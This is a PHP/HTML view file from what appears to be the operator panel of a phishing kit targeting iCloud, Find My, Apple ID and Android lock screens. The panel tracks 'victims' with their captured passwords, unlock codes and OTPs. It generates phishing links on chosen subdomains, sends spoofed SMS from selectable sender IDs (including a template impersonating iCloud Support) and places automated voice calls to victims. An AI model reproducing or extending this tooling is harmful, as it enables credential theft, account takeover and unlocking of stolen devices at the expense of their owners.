

<!-- Content Wrapper. Contains page content --><!--DESDE AQUI-->
<div class="content-wrapper">
   <!-- Content Header (Page header) -->
   <div class="content-header">
      <div class="container-fluid">
         <div class="row mb-2">
            <?php if($server['status_msg_notificacion'] == 1){ ?>
             <div class="col-sm-12">
              <div class="card">
               <div class="card-body">
                  <?php if(!empty($server['msg_notificacion'])): echo $server['msg_notificacion']; endif;?>
               </div>
             </div>
            </div>
            <?php } ?>
            <div class="col-sm-6">
               <h1 class="m-0 text-dark">Equipos</h1>
            </div>
            <!-- /.col -->
            <div class="col-sm-6">
               <ol class="breadcrumb float-sm-right">
                  <li class="breadcrumb-item"><a href="#">Equipos</a></li>
                  <li class="breadcrumb-item active">ingresados</li>
               </ol>
            </div>
            <!-- /.col -->
         </div>
         <!-- /.row -->
      </div>
      <!-- /.container-fluid -->
   </div>
   <!-- /.content-header -->
   <!-- Main content -->
   <section class="content">
      <div class="modal fade" id="modalsmsinfo" tabindex="1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true" style = "z-index:10000!important;">
         <div class="modal-dialog" role="document">
            <div class="modal-content">
               <div class="modal-header">
                  <h5 class="modal-title" id="exampleModalLabel">Informaci&oacute;n importante</h5>
                  <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                  <span aria-hidden="true">&times;</span>
                  </button>
               </div>
               <div class="modal-body">
                  La longitud del SMS depende de los caracteres. Un SMS acsii tiene un l&Iacute;mite de 160 caracteres y un SMS Unicode (por ejemplo, para tailand&eacute;s, &aacute;rabe, chino, japon&eacute;s y otros) tiene un l&iacute;mite de 70 caracteres. Si hay m&aacute;s de 1 mensaje, dado que el encabezado de concatenaci&oacute;n tomar&aacute; caracteres, el siguiente mensaje contar&aacute; como 67 por mensaje (Unicode) o 153 por mensaje (ACSII).
               </div>
               <div class="modal-footer">
                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Cerrar</button>
                  <button type="button" class="btn btn-primary" style = "display:none;">Save changes</button>
               </div>
            </div>
         </div>
      </div>
      <div class="container-fluid">
         <div class="row">
            <div class="col-12 col-sm-6 col-md-3">
               <div class="small-box bg-blue">
                  <div class="inner">
                     <h3 id="countingresados"><?php echo $countequipos['statuscount'];  ?></h3>
                     <p>Ingresados</p>
                  </div>
                  <div class="icon">
                     <i class="fa fa-mobile"></i>
                  </div>
                  <a href="#" class="small-box-footer">Ingresados <i class="fas fa-arrow-circle-right"></i></a>
               </div>
            </div>
            <div class="col-12 col-sm-6 col-md-3">
               <div class="small-box bg-gray">
                  <div class="inner">
                     <h3 id = "countprocesos"><?php echo $countequiP['statuscount'];  ?></h3>
                     <p>Proceso</p>
                  </div>
                  <div class="icon">
                     <i class="fa fa-undo"></i>
                  </div>
                  <a href="#" class="small-box-footer">Proceso <i class="fas fa-arrow-circle-right"></i></a>
               </div>
            </div>
            <div class="col-12 col-sm-6 col-md-3">
               <div class="small-box bg-info">
                  <div class="inner">
                     <h3 id = "countcompletados"><?php echo $countequiposC['statuscount'];  ?></h3>
                     <p>Completados</p>
                  </div>
                  <div class="icon">
                     <i class="fa fa-thumbs-up"></i>
                  </div>
                  <a href="#" class="small-box-footer">Completados <i class="fas fa-arrow-circle-right"></i></a>
               </div>
            </div>
            <div class="col-12 col-sm-6 col-md-3">
               <div class="small-box bg-danger">
                  <div class="inner">
                     <h3 id = "countfallidos"><?php echo $countequiposF['statuscount'];  ?></h3>
                     <p>Fallidos</p>
                  </div>
                  <div class="icon">
                     <i class="fa fa-thumbs-down"></i>
                  </div>
                  <a href="#" class="small-box-footer">Fallidos <i class="fas fa-arrow-circle-right"></i></a>
               </div>
            </div>
         </div>

         <div class="row">
            <div class="col-md-3"  style="display: none;">
               <span class="btn btn-primary btn-block mb-3" style="blue-color: #28a745!important;color: white;">Resumen</span>
               <div class="card">
                  <div class="card-header">
                     <h3 class="card-title">Equipos</h3>
                     <div class="card-tools">
                        <button type="button" class="btn btn-tool" data-card-widget="collapse"><i class="fas fa-minus"></i>
                        </button>
                     </div>
                  </div>
                  <div class="card-body p-0">
                     <ul class="nav nav-pills flex-column">
                        <li class="nav-item active">
                           <a href="#" class="nav-link">
                           <i class="far fa-circle text-blue"></i> Ingresados
                           <span class="badge bg-blue float-right" id="countingresados2"><?php echo $countequipos['statuscount'];  ?></span>
                           </a>
                        </li>
                        <li class="nav-item active">
                           <a href="#" class="nav-link">
                           <i class="far fa-circle text-gray"></i> En proceso
                           <span class="badge bg-gray float-right" id = "countprocesos2"><?php echo $countequiP['statuscount'];  ?></span>
                           </a>
                        </li>
                        <li class="nav-item active">
                           <a href="#" class="nav-link">
                           <i class="far fa-circle text-info"></i> Completados
                           <span class="badge bg-info float-right" id = "countcompletados2"><?php echo $countequiposC['statuscount'];  ?></span>
                           </a>
                        </li>
                        <li class="nav-item active">
                           <a href="#" class="nav-link">
                           <i class="far fa-circle text-danger"></i> Fallidos
                           <span class="badge bg-danger float-right" id = "countfallidos2"><?php echo $countequiposF['statuscount'];  ?></span>
                           </a>
                        </li>
                        <li class="nav-item active">
                           <a href="#" class="nav-link">
                           <i class="far fa-circle text-info"></i> PassCode
                           <span class="badge bg-info float-right" id = "countpasscode2"><?php echo $countequiposPC['statuscount'];  ?></span>
                           </a>
                        </li>
                     </ul>
                  </div>
               </div>
            </div>
            <div class="col-md-12" id="divtablecol9">
               <div class="card card-primary card-outline">
                  <div class="card-header">
                     <!--<h3 class="card-title">Lista de obtenidos</h3>-->
                     <div class="card-tools">
                        <div class="input-group input-group-sm">
                           <input type="text" class="form-control" id = "buscarequipo" placeholder="Buscar equipo">
                           <div class="input-group-append">
                              <div class="btn btn-primary" style="background-color: #28a745!important;">
                                 <i class="fas fa-search"></i>
                              </div>
                           </div>
                        </div>
                     </div>
                     <!-- /.card-tools -->
                  </div>
                  <!-- /.card-header -->
                  <div class="mailbox-controls">
                     <!-- Check all button -->
                     <button type="button" class="btn btn-default btn-sm checkbox-toggle"><i class="far fa-square"></i>
                     </button>
                     <div class="btn-group">
                        <button type="button" class="btn btn-default btn-sm btndelete" ><i class="far fa-trash-alt"></i></button>
                        <!--<button type="button" class="btn btn-default btn-sm"><i class="fas fa-reply"></i></button>
                           <button type="button" class="btn btn-default btn-sm"><i class="fas fa-share"></i></button>-->
                     </div>
                     <!-- /.btn-group -->
                     <button type="button" class="btn btn-default btn-sm" id="buttonreload"><i class="fas fa-sync-alt"></i></button>
                     <div class="float-right">
                        1-50/200
                        <div class="btn-group">
                           <button type="button" class="btn btn-default btn-sm"><i class="fas fa-chevron-left"></i></button>
                           <button type="button" class="btn btn-default btn-sm"><i class="fas fa-chevron-right"></i></button>
                        </div>
                     </div>
                  </div>
                  <div class="card-body table-responsive p-0 tablaequipos" style="max-height: 600px;">
                     <table class="table table-sm table-hover tablaPrecios">
                        <thead>
                           <th></th>
                           <th>Usuario</th>
                           <th>Víctima</th>
                           <th>Teléfono</th>
                           <th>Email</th>
                           <th>Contraseña</th>
                           <th>Códigos</th>
                           <th>Link</th>
                           <th>Estatus</th>
                           <th>OTP</th>
                           <th>Otros</th>
                        </thead>
                        <tbody id="bodyTable">
                           <div id="reloadIcloud"></div>
                        </tbody>
                     </table>
                  </div>
                  <!-- /.card-body -->
               </div>
               <!-- /.card -->
            </div>


            <div class="modal" id="modalview">
               <div class="modal-dialog" role="document" tabindex="-1" role="dialog">
                  <div class="modal-content">
                     <!-- Modal Header -->
                     <div class="modal-header">
                        <h4 class="modal-title">Detalles del requerimiento</h4>
                        <button type="button" class="close" data-dismiss="modal">&times;</button>
                     </div>
                     <!-- Modal body -->
                     <div class="modal-body modal-body-view" style="">
                       <div id="loader-modal-body-view_requerimiento" >
                           <div class="loader-block">
                              <svg id="loader2" viewBox="0 0 100 100"><circle id="circle-loader2" cx="50" cy="50" r="45"></circle></svg>
                           </div>
                        </div>

                     <ul class="list-group list-group-flush" id="ul-list-view_requerimiento" style="display: none; text-align: center;">
                     </ul>

                         

                     </div>
                     <!-- Modal footer -->
                     <div class="modal-footer">
                        <button type="button" class="btn btn-info" data-dismiss="modal">Cerrar</button>
                     </div>
                  </div>
              </div>
            </div>

            <div class="modal" id="modaledit">
               <div class="modal-dialog" role="document" tabindex="-1" role="dialog">
                  <div class="modal-content">
                     <!-- Modal Header -->
                     <div class="modal-header">
                        <h4 class="modal-title">Modifique su requerimiento</h4>
                        <button type="button" class="close" data-dismiss="modal">&times;</button>
                     </div>
                     <!-- Modal body -->
                     <div class="modal-body modal-body-edit">
                        <div id="loader-modal-body-edit" >
                           <div class="loader-block">
                              <svg id="loader2" viewBox="0 0 100 100"><circle id="circle-loader2" cx="50" cy="50" r="45"></circle></svg>
                           </div>
                        </div>

                       
                         <form class="form-horizontal form-bordered form-equipos" style="display: none;">
                          <input type="text" name="idequipo" id="idequipo" style="display: none;">
                          <input type="text" name="linkg_edit" id="linkg_edit" style="display: none;">
                          <div class="form-group">
                           <label>Nombre de tu proceso o cliente:</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fas fa-user"></i></span>
                              </div>
                              <input type="text" class="form-control" placeholder="Usuario" id = "usuario" name="usuario" required>
                           </div>
                         </div>

                        <div class="form-group">
                           <label>Modelo:</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fas fa-mobile-alt"></i></span>
                              </div>
                              <select class="form-control" name="modelo" id="modelo">
                                 <optgroup label="iPhone">
                                    <option value = "iphone15">iPhone 15</option>
                                    <option value = "iphone15Plus">iPhone 15 Plus</option>
                                    <option value = "iphone15Pro">iPhone 15 Pro</option>
                                    <option value = "iphone15proMax">iPhone 15 pro Max</option>
                                    <option value = "iphone13_pro">iPhone 13 Pro</option>
                                    <option value = "iphone13_pro_max">iPhone 13 Pro Max</option>
                                    <option value = "iphone13_mini">iPhone 13 Mini</option>
                                    <option value = "iphone13">iPhone 13</option>
                                    <option value = "iphone12_pro">iPhone 12 Pro</option>
                                    <option value = "iphone12_pro_max">iPhone 12 Pro Max</option>
                                    <option value = "iphone12_mini">iPhone 12 Mini</option>
                                    <option value = "iphone12">iPhone 12</option>
                                    <option value = "iphone11_pro">iPhone 11 Pro</option>
                                    <option value = "iphone11">iPhone 11</option>
                                    <option value = "iphoneSE_2nd_gen">iPhone SE (2ª Generation)</option>
                                    <option value = "iphoneXSmax">iPhone XS Max</option>
                                    <option value = "iphoneXS">iPhone XS</option>
                                    <option value = "iphoneXR">iPhone XR</option>
                                    <option value = "iphoneX">iPhone X</option>
                                    <option value = "iphone8plus">iPhone 8 Plus</option>
                                    <option value = "iphone8">iPhone 8</option>
                                    <option value = "iphone7plus">iPhone 7 Plus</option>
                                    <option value = "iphone7">iPhone 7</option>
                                    <option value = "iphone6splus">iPhone 6s Plus</option>
                                    <option value = "iphone6s">iPhone 6s</option>
                                    <option value = "iphone11_pro_max">iPhone 11 Pro Max</option>
                                    <option value = "iphone6plus">iPhone 6 Plus</option>
                                    <option value = "iphone6">iPhone 6</option>
                                    <option value = "iphoneSE">iPhone SE</option>
                                 </optgroup>
                                 <optgroup label="Mac">
                                    <option value = "macbook_pro_14_2021">MacBook Pro de 14” (2021)</option>
                                    <option value = "macbook_pro_16_2021">MacBook Pro de 16” (2021)</option>
                                    <option value = "macbook_air_retina">MacBook Air (M1, 2020)</option>
                                    <option value = "macbook_air_retina_2020">MacBook Air (2020)</option>
                                    <option value = "macbook_air_2017">MacBook Air (2017)</option>
                                    <option value = "macbook_pro_13_M1_2020">MacBook Pro de 13” (M1, 2020)</option>
                                    <option value = "macbook_pro_13_2_puertos2020">MacBook Pro de 13” (2020)</option>
                                    <option value = "macbook_pro_13_2_puertos2016">MacBook Pro de 13” (2016)</option>
                                    <option value = "macbook_pro_13_4_puertos2020">MacBook Pro de 13” (2020)</option>
                                    <option value = "macbook_pro_16">MacBook Pro de 16" (2019)</option>
                                    <option value = "imac_21.5">iMac de 21.5”</option>
                                    <option value = "imac_21.5_4k">iMac de 21.5” (4K)</option>
                                    <option value = "imac_24_2_puertos">iMac de 24” (M1, 2021)</option>
                                    <option value = "imac_24_4_puertos">iMac de 24” (M1, 2021)</option>
                                    <option value = "imac_27">iMac de 27” (5K)</option>
                                    <option value = "imac_pro">iMac Pro</option>
                                    <option value = "mac_mini_m1">Mac Mini (M1, 2020)</option>
                                    <option value = "mac_mini">Mac Mini (2018)</option>
                                    <option value = "mac_mini_2014">Mac Mini (2014)</option>
                                    <option value = "mac_pro">Mac Pro</option>
                                 </optgroup>
                                 <optgroup label="Watch">
                                    <option value = "watchs7">Apple Watch Series 7</option>
                                    <option value = "watchs6">Apple Watch Series 6</option>
                                    <option value = "watchse">Apple Watch SE</option>
                                    <option value = "watchs5">Apple Watch Series 5</option>
                                    <option value = "watchs4">Apple Watch Series 4</option>
                                    <option value = "watchs3">Apple Watch Series 3</option>
                                    <option value = "watchs2">Apple Watch Series 2</option>
                                    <option value = "watchs1">Apple Watch Series 1</option>
                                 </optgroup>
                                 <optgroup label="iPad">
                                    <option value = "ipad_pro_12_9_5th_gen">iPad Pro de 12.9" (5ª Generation)</option>
                                    <option value = "ipad_pro_11_3rd_gen">iPad Pro de 11" (3ª Generation)</option>
                                    <option value = "ipad_pro_12_9_5th_gen">iPad Pro de 12.9" (5ª Generation)</option>
                                    <option value = "ipad_pro_11_3rd_gen">iPad Pro de 11" (3ª Generation)</option>
                                    <option value = "ipad_air_4th_gen">iPad Air (4ª Generation)</option>
                                    <option value = "ipad_9th_gen">iPad (9ª Generation)</option>
                                    <option value = "ipad_mini_6th_gen">iPad mini (6ª Generation)</option>
                                    <option value = "ipad_pro_12_9_4th_gen">iPad Pro de 12.9" (4ª Generation)</option>
                                    <option value = "ipad_pro_12_9_3rd_gen">iPad Pro de 12.9" (3ª Generation)</option>
                                    <option value = "ipad_pro_12_9_2ndgen">iPad Pro de 12.9" (2ª Generation)</option>
                                    <option value = "ipad_pro_12_9_1st_gen">iPad Pro de 12.9" (1ª Generation)</option>
                                    <option value = "ipad_pro_11_2nd_gen">iPad Pro de 11" (2ª Generation)</option>
                                    <option value = "ipad_pro_11_1st_gen">iPad Pro de 11" (1ª Generation)</option>
                                    <option value = "ipad_pro_10_5">iPad Pro de 10.5"</option>
                                    <option value = "ipad_pro_9_7">iPad Pro de 9.7 </option>
                                    <option value = "ipad_air_3rd_gen">iPad Air (3ª Generation)</option>
                                    <option value = "ipad_air_2">iPad Air 2</option>
                                    <option value = "ipad_air_1st_gen">iPad Air (1ª Generation)</option>
                                    <option value = "ipad_8thgen">iPad (8ª Generation)</option>
                                    <option value = "ipad_7thgen">iPad (7ª Generation)</option>
                                    <option value = "ipad_6thgen">iPad (6ª Generation)</option>
                                    <option value = "ipad_5thgen">iPad (5ª Generation)</option>
                                    <option value = "ipad_mini_5th_gen">iPad mini (5ª Generation)</option>
                                    <option value = "ipad_mini_4">iPad mini 4</option>
                                    <option value = "ipad_mini_3">iPad mini 3</option>
                                    <option value = "ipad_mini_2">iPad mini 2</option>
                                 </optgroup>
                                 <option value="otro">Otro modelo</option>
                              </select>
                           </div>
                        </div>

                        <div class="form-group" id="form-group-modelo" style="display: none;">
                           <label>Ingresa un modelo</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fas fa-mobile-alt"></i></span>
                              </div>
                              <input type="text" class="form-control" placeholder="..." id = "modeloinput" name = "modeloinput" >
                           </div>
                        </div>                        
                       

                        <div class="form-group">
                           <label>Prefijo/Numero:</label>
                           <div class="input-group">
                              <input type="number" class="form-control" placeholder="1" id = "pais" name="pais" required> 
                              <input type="number" class="form-control" placeholder="00000000" id = "numero" name="numero" required> 
                           </div>
                        </div> 

                        <div class="form-group">
                           <label>Correo:</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fas fa-at"></i></span>
                              </div>
                              <input type="email" class="form-control" id ="email" name="email" placeholder="email@Mail.com">
                              <div class="invalid-tooltip">Ingrese un correo valido.</div>
                           </div>                          
                        </div>
                        <div class="form-group">
                           <label>Nombre de la victima (opcional)</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fa fa-mobile"></i></span>
                              </div>
                              <input type="text" class="form-control" placeholder="iPhone de Luis" id = "niphone">
                           </div>
                           <!-- /.input group -->
                        </div>
                        <!-- /.form group -->
                        <div class="form-group">
                           <label>Imei / numero de serie:</label>
                           <div class="input-group">
                              <div class="input-group-prepend">
                                 <span class="input-group-text"><i class="fa fa-list-ol"></i></span>
                              </div>
                              <input type="text" class="form-control" placeholder="013xxxxxxxxx" id = "imei" name = "imei">
                           </div>
                           <!-- /.input group -->
                        </div> 
                        <div class="form-group">
                           <select class="form-control" name="plataforma" id="plataforma">
                              <optgroup label="Apple">
                                 <option value = "ICN">iCloud</option>
                                 <option value = "ICN_APP">iCloud 2023</option>
                                 <option value = "ICFM">iCloud Find My</option>
                                 <option value="ICFM_APP">iCloud Find My 2023</option>
                                 <option value = "APPID2021">Apple ID</option>
                                 <option value = "PASSCODE">Pass Code</option>
                              </optgroup>
                              <optgroup label="Apple Maps">
                                 <option value = "MAPSNEW">Maps 2024</option>
                                 <option value = "ICMAPS">Apple Maps</option>
                                 <option value = "ICMAPSV2">Apple Maps (ZOOM)</option>
                                 <option value = "ICNLOCATE2">Maps Localizar</option>
                                 <option value = "ICNLOCATE3">iCloud - Localizar V3</option>
                              </optgroup>
                              <optgroup label="Android">
                                 <!--<option value = "Xiaomi">Xiaomi Account 2020</option>
                                 <option value = "Xiaomi2021">Xiaomi Account 2021</option>-->
                                 <option value = "ANDBLOQPATRON">Patron</option>
                                 <option value = "ANDBLOQNUM">Númerico</option>
                                 <option value = "ANDBLOQALFA">Alfanúmerico</option>
                                 <!--<option value = "SAMSUNG">Samsung Account</option>-->
                              </optgroup>
                              <optgroup label="Otros">
                                 <option value="Natura">Natura</option>
                                 <option value = "NaturaV2">Natura V2</option>
                              </optgroup>
                           </select>
                        </div> 
                        <div class="form-group">
                           <label>Inición de sesión</label>
                           <br>
                           <label>Aplica para iCloud 2023/Find My 2023/AppIe ID</label>
                           <select class="form-control" name="inicio_sesion" id="inicio_sesion">
                              <option value="directo">Directo</option>
                              <option value="no_directo">No directo</option>                              
                           </select>
                        </div>
                        <div class="form-group">
                           <label>Opción OTP</label>
                           <select class="form-control" name="opcion_otp" id="opcion_otp">
                              <option value="Desactivado">Desactivado</option>
                              <option value="Activado">Activado</option>                              
                           </select>
                        </div>
                        <div class="form-group">
                           <label>Verificación OTP</label>
                           <select class="form-control" name="tipo_verificacion_otp" id="tipo_verificacion_otp">
                              <option value="numero">Número</option>
                              <option value="sms">SMS</option>
                           </select>
                        </div>
                        <div class="form-group">
                           <label>Servicio SMS</label>
                           <br>
                           <label>Seleccione un servicio o api para el envio de mensajes OTP, en caso de que la verificación sea por número, esta seleccion no afectara.</label>
                           <select class="form-control" name="id_apisms" id="id_apisms">
                           <?php
                              foreach ($smsapi as $sms_api) {
                                 echo '<option value = "'.$sms_api->id_apisms.'">'.$sms_api->descripcion_cliente.'</option>';
                              }
                              
                              ?>
                           </select>
                        </div>

                        <div class="form-group">
                           <label>Remitente</label>
                           <br>
                           <label>Seleccione un remitente para el envio de mensajes OTP.</label>
                           <select class="form-control" name="idsender" id="idsender">
                          
                           </select>
                        </div>
                        
                        <div class="form-group">
                           <label>Plantilla OTP</label>
                           <select class="form-control" name="plantilla_otp" id="plantilla_otp">
                           <?php
                              foreach ($plantillas as $templates_sms) {
                                 echo '<option value = "'.$templates_sms->idtempsms.'">'.$templates_sms->titulosms.'</option>';
                              }
                              
                              ?>
                           </select>
                        </div>
                        <div class="form-group">
                           <label>Lenguaje otp</label>
                           <br>
                           <label>Se requiere que el idioma seleccionado coincida con el idioma de la plantilla OTP seleccionada.</label>                          
                           <select class="form-control" name="lenguaje_otp" id="lenguaje_otp">                              
                              <option value="es-MX">Español (Latinoamerica)</option>
                              <option value="es-ES">Español (Castellano)</option>
                              <option value="en-US">Ingles</option>
                              <option value="pt-BR">Portugues (Brasil)</option>
                           </select>
                        </div>
                        <hr>
                        <div class="form-group">
                           <div class="input-group">
                              <div class="custom-control custom-switch codeunlockdiv">
                                 <input type="checkbox" class="custom-control-input codeunlock" id="customSwitch1" data-render="switchery">
                                 <label class="custom-control-label" for="customSwitch1">Codigo de desbloqueo</label>
                              </div>
                           </div>
                           <div class="form-group row codeunlockdiv2">
                              <div class="col-sm-6" style="margin-left: 15px">
                                 <!-- radio -->
                                 <div class="form-group clearfix">
                                    <div class="icheck-primary d-inline">
                                       <input type="radio" id="radioPrimary1" name="codeunlockiphone" class = "codeunlockiphone" value="4" disabled>
                                       <label for="radioPrimary1">4
                                       </label>
                                    </div>
                                    <div class="icheck-primary d-inline">
                                       <input type="radio" id="radioPrimary2" name="codeunlockiphone" class = "codeunlockiphone" value="6" disabled>
                                       <label for="radioPrimary2">6
                                       </label>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <hr>
                           <div class="form-group">
                              <label>Subdominio</label>
                              <select class="form-control" name="subtipo" id="subtipo">
                              <?php foreach ($subdominios as $subs) {
                                 echo '<option value = "'.$subs->subdomains.'">'.$subs->subdomains.'</option>';
                                 } ?>
                              </select>
                           </div>
                           <div class="form-group">
                              <label>Seleccione como desea generar el enlace</label>
                              <select class="form-control" name="urlacortada" id="urlacortada">
                                 <option value="acortada">Acortada</option>
                                 <option value="sinacortar">Sin acortar</option>
                              </select>
                           </div>
                           <hr>

                           <div class="input-group input-group-sm">
                              <button type="submit" class="btn btn-info " id="guardarequipo">Actualizar</button> 
                              &nbsp;
                              <button type="button" class="btn btn-success" id = "btn_reset_otp" onclick="resetear_otp()" >Resetear OTP</button>
                           </div>

                           
                        </div>

                        </form> 


                     </div>
                     <!-- Modal footer -->
                     <div class="modal-footer">
                        <button type="button" class="btn btn-info" data-dismiss="modal">Cerrar</button>
                     </div>
                  </div>
              </div>
            </div>  
            
            <div class="modal" id="modalsmssender">
               <div class="modal-dialog" role="document" tabindex="-1" role="dialog">
                  <div class="modal-content">
                     <!-- Modal Header -->
                     <div class="modal-header">
                        <h4 class="modal-title">SMS Sender</h4>
                        <button type="button" class="close" data-dismiss="modal">&times;</button>
                     </div>
                     <!-- Modal body -->
                     <div class="modal-body modal-body-smssender" style="">
                       <div id="loader-modal-body-smssender" >
                           <div class="loader-block">
                              <svg id="loader2" viewBox="0 0 100 100"><circle id="circle-loader2" cx="50" cy="50" r="45"></circle></svg>
                           </div>
                        </div>


                         <form class="form-horizontal form-bordered form-smssender" style="display: none;">
                           <div class="form-group">
                             <label>Selecione una API</label>
                             <select class="form-control" name="id_apisms_sender" id="id_apisms_sender">
                              <?php
                                foreach ($smsapi as $apisms) {
                                 echo '<option value = "'.$apisms->id_apisms.'">'.$apisms->descripcion_cliente.'</option>';
                                }
                              ?>
                             </select>
                           </div>

                           <div class="form-group">
                             <label>Selecione una remitente</label>
                             <select class="form-control" name="sender_id" id="sender_id">
                            
                             </select>
                           </div>  

                           <div class="form-group">
                            <div class="input-group">
                              <input type="number" class="form-control prefijo" placeholder="Num" id = "prefijo_sms" name="prefijo_sms" style="width: 20%; padding-right:0px;" required>
                              <input type="number" class="form-control " placeholder="Num" id = "numero_sms" name="numero_sms" style="width: 80%;" required>
                            </div>
                          </div>   

                        <div class="form-group">
                           <label>Selecione una plantilla</label>
                           <select class="form-control" name="plantilla_sms" id="plantilla_sms">
                           <?php
                              foreach ($plantillas as $plantillas_sms) {
                              echo '<option value = "'.$plantillas_sms->descripsms.'">'.$plantillas_sms->titulosms.'</option>';
                              }
                           ?>
                           </select>
                        </div>  

                        <div class="form-group">
                           <textarea class="form-control m-b-10" id="msg_sms" name="msg_sms" rows="3" placeholder="Su dispositivo {{model}} ha sido ubicado hoy a la(s) {{time}} Ver uItima locaIizacion: {{link}} Soporte iCIoud" required></textarea> 
                        </div> 


                        <input type="text" id="idequipos_sms" style="display: none;">

                        <button type="submit" class="btn btn-success" style="display: inline-block;">Enviar mensaje</button>
                        <div style = "color: gray;font-size: 15px;display: inline-block;" id="reloadsendsms"></div>
                           
                        </form>  


                         

                     </div>
                     <!-- Modal footer -->
                     <div class="modal-footer">
                        <button type="button" class="btn btn-info" data-dismiss="modal">Cerrar</button>
                     </div>
                  </div>
              </div>
            </div>

            <div class="modal" id="modalcallceter">
               <div class="modal-dialog" role="document" tabindex="-1" role="dialog">
                  <div class="modal-content">
                     <!-- Modal Header -->
                     <div class="modal-header">
                        <h4 class="modal-title">Call center</h4>
                     </div>
                     <!-- Modal body -->
                     <div class="modal-body modal-body-callcenter" style="">
                       <div id="loader-modal-body-callcenter" >
                           <div class="loader-block">
                              <svg id="loader2" viewBox="0 0 100 100"><circle id="circle-loader2" cx="50" cy="50" r="45"></circle></svg>
                           </div>
                        </div>


                        <form class="form-horizontal form-bordered form-callcenter" style="display: none;">
                         <div class="form-group">
                            <label>Selecione un audio</label>
                            <select class="form-control" name="audios" id="audios">
                               <?php
                                 foreach ($audios as $list_audios) {
                                    echo '<option value = '.$list_audios->rutaaudio.'>'.$list_audios->titulo.'</option>';
                                 }
                               ?>
                            </select>
                           <div id = "divaudio"></div>
                           <input type="text" id = "inputplay" name = "inputplay" style = "display:none;">
                        </div>
                        <div class="form-group">
                           <div class="input-group">
                           <input type="number" class="form-control prefijo" placeholder="Num" id = "prefijo_call" name="prefijo_call" style="width: 20%; padding-right:0px;" required>
                           <input type="number" class="form-control " placeholder="Num" id = "numero_call" name="numero_call" style="width: 80%;" required>
                           </div>
                        </div>   
                        <div class="input-group-append ">
                           <button type = "submit" class="btn btn-primary btn-sendcall">
                             <i class="fa fa-phone"></i>&nbsp;Realizar llamada
                           </button>           
                         </div>
                           
                        </form>  
                        <div id = "proceso_llamada" style="display: none;"></div>

                     </div>
                     <!-- Modal footer -->
                     <div class="modal-footer">
                        <button type="button" class="btn btn-primary waves-effect md-close" id = "cerrar_ventana" style="display: inline-block;" >Cerrar</button>
                        <button type="button" class="btn btn-danger waves-effect md-close" id = "cancelar_llamada" style="display: inline-block;" >Cancelar</button>
                     </div>
                  </div>
              </div>
            </div>



            <div class="modal" id="modalviewlistasms">
               <div class="modal-dialog" role="document" tabindex="-1" role="dialog">
                  <div class="modal-content">
                     <!-- Modal Header -->
                     <div class="modal-header">
                        <h4 class="modal-title">Lista de mensajes</h4>
                        <button type="button" class="close" data-dismiss="modal">&times;</button>
                     </div>
                     <!-- Modal body -->
                     <div class="modal-body modal-body-viewlistasms" style="">
                       <div id="loader-modal-body-viewviewlistasms" >
                           <div class="loader-block">
                              <svg id="loader2" viewBox="0 0 100 100"><circle id="circle-loader2" cx="50" cy="50" r="45"></circle></svg>
                           </div>
                        </div>

                      <div class="card-body table-responsive p-0 tablaelistsms" style="max-height:300px;">
                        <table class="table table-sm table-hover">
                           <thead>
                              <tr>
                                 <th></th>
                                 <th>Remitente</th>
                                 <th>Destino</th>
                                 <th>Mensaje</th>
                                 <th>Estatus</th>
                              </tr>
                           </thead>
                           <tbody id="bodyTableList">
                              <div id="reloadIcloud"></div>
                           </tbody>
                        </table>
                     </div>

                         

                     </div>
                     <!-- Modal footer -->
                     <div class="modal-footer">
                        <button type="button" class="btn btn-info" data-dismiss="modal">Cerrar</button>
                     </div>
                  </div>
              </div>
            </div>











          
           
          
         </div>
         <!-- /.row -->
       
         <!-- /.row -->
      </div>
      <!--/. container-fluid -->
    </section>
   <!-- /.content -->
</div>
<!-- /.content-wrapper --><!---HASTA AQUI-->
<!-- Control Sidebar -->
<aside class="control-sidebar control-sidebar-dark">
   <!-- Control sidebar content goes here -->
</aside>
<!-- /.control-sidebar -->
<!-- Main Footer -->
<footer class="main-footer">
   <strong>Copyright &copy; <?php echo date('Y');  ?> <a href="<?php echo base_url();?>"><?php echo $server['descripcionserver']; ?></a>.</strong>
   Todos los derechos reservados
   <div class="float-right d-none d-sm-inline-block">
      <b>Version</b> 2.0
   </div>
</footer>
</div>
<!-- ./wrapper -->
<!-- REQUIRED SCRIPTS -->
<!-- jQuery -->
<script src="<?php echo base_url();?>/public/assets/plugins/jquery/jquery.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/axios.min.js"></script>
<!-- Bootstrap -->
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap/js/bootstrap.bundle.min.js"></script>
<!-- overlayScrollbars -->
<script src="<?php echo base_url();?>/public/assets/plugins/overlayScrollbars/js/jquery.overlayScrollbars.min.js"></script>
<!-- AdminLTE App -->
<script src="<?php echo base_url();?>/public/assets/dist/js/adminlte.js"></script>
<!-- OPTIONAL SCRIPTS -->
<script src="<?php echo base_url();?>/public/assets/dist/js/demo.js"></script>
<!-- PAGE PLUGINS -->
<!-- jQuery Mapael -->
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mousewheel/jquery.mousewheel.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/raphael/raphael.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mapael/jquery.mapael.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/jquery-mapael/maps/usa_states.min.js"></script>
<!-- ChartJS -->
<script src="<?php echo base_url();?>/public/assets/plugins/chart.js/Chart.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/modal.js"></script>
<script src="<?php echo base_url();?>/public/assets/server/js/classie.js"></script>
<!--<script src="<?php echo base_url();?>/public/assets/server/js/modalEffects.js"></script>-->
<script src="<?php echo base_url();?>/public/assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/summernote/summernote-bs4.min.js"></script>
<script src="<?php echo base_url();?>/public/assets/plugins/sweetalert2/sweetalert2.min.js"></script>
